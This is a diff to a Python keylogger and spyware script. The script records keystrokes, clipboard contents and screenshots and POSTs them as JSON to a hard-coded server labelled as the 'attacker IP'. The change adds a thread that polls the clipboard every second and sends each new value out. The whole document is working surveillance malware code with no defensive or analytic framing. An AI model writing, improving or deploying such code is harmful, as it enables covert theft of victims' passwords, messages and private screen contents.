@@ -17,17 +17,19 @@ from pynput import keyboard
 import requests
 import json
 import threading
-import pyperclip  # Add this import
-from PIL import ImageGrab  # Import ImageGrab from Pillow
+import pyperclip
+from PIL import ImageGrab
 import io
 import base64
+import time
 
 keystrokes = ""  # Global variable to store captured keystrokes
 clipboard_data = ""  # Global variable to store clipboard content
+previous_clipboard_data = ""  # To track the previous clipboard content
 
-server_ip = "192.168.135.174"  # Change this based on your attacker IP
+server_ip = "192.168.43.26"  # Change this based on your attacker IP
 server_port = 8080  # Change this based on your specified port
-send_interval = 5  # Interval (in seconds) between sending data to the server
+send_interval = 5  # Interval (in seconds) between sending data to the server (Change if needed)
 
 # Track whether Ctrl, Alt, Shift is pressed
 ctrl_pressed = False
@@ -41,17 +43,14 @@ def send_data():
         buffered = io.BytesIO()
         screenshot.save(buffered, format="PNG")
         screenshot_base64 = base64.b64encode(buffered.getvalue()).decode()
-
         # Create payload with keystrokes, clipboard data, and screenshot in JSON format
         payload = json.dumps({
             "keyboardData": keystrokes,
             "clipboardData": clipboard_data,
             "screenshot": screenshot_base64
         })
-
         # Send POST request to the server with the keystrokes, clipboard data, and screenshot
         r = requests.post(f"http://{server_ip}:{server_port}", data=payload, headers={"Content-Type": "application/json"})
-
         # Schedule next call to send_data function after specified interval
         timer = threading.Timer(send_interval, send_data)
         timer.start()
@@ -98,14 +97,23 @@ def on_release(key):
     elif key == keyboard.Key.shift_l or key == keyboard.Key.shift_r or key == keyboard.Key.shift:
         shift_pressed = False
 
-def capture_clipboard():
-    global clipboard_data
-    clipboard_data = pyperclip.paste()  # Capture current clipboard content
-    # Schedule next clipboard capture after specified interval
-    threading.Timer(send_interval, capture_clipboard).start()
+def monitor_clipboard():
+    global clipboard_data, previous_clipboard_data
+    while True:
+        current_clipboard_data = pyperclip.paste()  # Capture current clipboard content
+        if current_clipboard_data != previous_clipboard_data and current_clipboard_data.strip() != "":
+            previous_clipboard_data = current_clipboard_data
+            # Send the clipboard data to the server
+            payload = json.dumps({"clipboardData": current_clipboard_data})
+            try:
+                r = requests.post(f"http://{server_ip}:{server_port}", data=payload, headers={"Content-Type": "application/json"})
+            except Exception as e:
+                print(f"Failed to send clipboard data: {e}")
+        time.sleep(1)  # Polling interval (Change if needed)
 
 # Set up and start the keyboard listener
 with keyboard.Listener(on_press=handle_keystrokes, on_release=on_release) as listener:
     send_data()
-    capture_clipboard()  # Start capturing clipboard data
+    clipboard_thread = threading.Thread(target=monitor_clipboard, daemon=True)
+    clipboard_thread.start()
     listener.join()
